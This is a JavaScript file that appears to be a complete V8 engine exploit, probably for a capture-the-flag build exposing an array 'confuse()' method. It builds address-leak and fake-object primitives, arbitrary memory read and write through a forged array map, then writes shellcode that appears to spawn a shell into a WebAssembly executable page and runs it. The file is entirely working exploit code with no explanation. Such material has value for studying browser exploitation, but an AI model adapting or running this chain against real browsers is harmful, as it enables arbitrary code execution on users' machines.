var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) {
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

function itof(val) {
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function itof64(val_low, val_high) {
    var lower = Number(val_low);
    var upper = Number(val_high);
    u64_buf[0] = lower;
    u64_buf[1] = upper;
    return f64_buf[0];
}


const logInfo = (m) => console.log(`[*] ${m}`);
const logOK   = (m) => console.log(`[+] ${m}`);
const logErr  = (m) => console.log(`[-] ${m}`);

function toHex(value) {
    return "0x" + value.toString(16);
}

function assert(c, m="assert") {
  if (c) return;
  let at = "";
  try { at = ((new Error()).stack || "").split("\n")[2].trim(); } catch {}
  const e = new Error(`[ASSERT] ${m}` + (at ? `\n  at ${at}` : ""));
  if (Error.captureStackTrace) Error.captureStackTrace(e, assert);
  throw e;
}

let a = ["a", "b"];
function AddrOf(obj) {
    a[0] = obj;
    a.confuse();
    let ret_val = ftoi(a[0]) & 0xffffffffn; // mask to 32 bits
    // a now is PACKED_DOUBLE_ELEMENTS array, so "a" is stored as double
    // we need to revert it back to normal
    a[0] = "a";
    a.confuse();
    return ret_val;
}

function FakeObj(addr) {
    let fake = [1.1, 2.2, 3.3, 4.4, 5.5];
    fake[0] = itof(addr);
    fake.confuse();
    return fake[0];
}

let fake_array_map = [itof(0x31040404001c0201n), itof(0x0a0007ff11000844n), itof(0x001cb82d001cb1c5n), itof(0x00000735001cb7f9n)];
function arbRead(addr) {
    // Make sure the addr is aligned
    if (addr % 2n == 0)
        addr += 1n;

	let fake_obj = [itof64(AddrOf(fake_array_map)+0x44n, 0), itof64(addr, 0x8)];
    let fake = FakeObj(AddrOf(fake_obj)+0x90n);

    return ftoi(fake[0]);
}

function arbWrite(addr, value) {
    // Make sure the addr is aligned
    if (addr % 2n == 0)
        addr += 1n;

    let fake_obj = [itof64(AddrOf(fake_array_map)+0x44n, 0), itof64(addr, 0x8)];
    let fake = FakeObj(AddrOf(fake_obj)+0x90n);

    fake[0] = itof(value);
}

function copy_shellcode(addr, shellcode) {
    let buf = new ArrayBuffer(0x100);
    let buf_view = new DataView(buf); // Use DataView for easier writing

    let buf_addr = AddrOf(buf);
    let backing_store_addr = buf_addr + 0x24n-8n;

    arbWrite(backing_store_addr, addr);

    for (let i = 0; i < shellcode.length; i++) {
	    buf_view.setUint32(4*i, shellcode[i], true);
    }
}

let wasm_code = new Uint8Array([
    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x05, 0x01, 0x60,
    0x00, 0x01, 0x7f, 0x03, 0x02, 0x01, 0x00, 0x07, 0x08, 0x01, 0x04, 0x6d,
    0x61, 0x69, 0x6e, 0x00, 0x00, 0x0a, 0x06, 0x01, 0x04, 0x00, 0x41, 0x2a,
    0x0b
]);

let wasm_mod = new WebAssembly.Module(wasm_code);
let wasm_instance = new WebAssembly.Instance(wasm_mod);
let f = wasm_instance.exports.main;

let wasm_inst_addr = AddrOf(wasm_instance);
let trusted_data_ptr = wasm_inst_addr + 0xcn;
let trusted_data = arbRead(trusted_data_ptr - 0x8n) & 0xffffffffn;

logInfo("WASM Instance Addr: " + toHex(wasm_inst_addr));
logInfo("Trusted Data Addr: " + toHex(trusted_data_ptr));
logInfo("RWX Page Addr: " + toHex(trusted_data));

let rwx_ptr = trusted_data + 0x28n - 1n
let rwx_base = arbRead(rwx_ptr);

logInfo("RWX Pointer Addr: " + toHex(rwx_ptr));
logInfo("RWX Base Addr: " + toHex(rwx_base));


let shellcode = [
    0x90909090, 0x90909090, 0xb848686a, 0x6e69622f, 0x732f2f2f, 0xe7894850,
    0x01697268, 0x24348101, 0x01010101, 0x6a56f631, 0x01485e08, 0x894856e6,
    0x6ad231e6, 0x050f583b
];

logInfo("Copying Shellcode to RWX Page...");
copy_shellcode(rwx_base, shellcode);

logInfo("Triggering Shellcode...");
f();
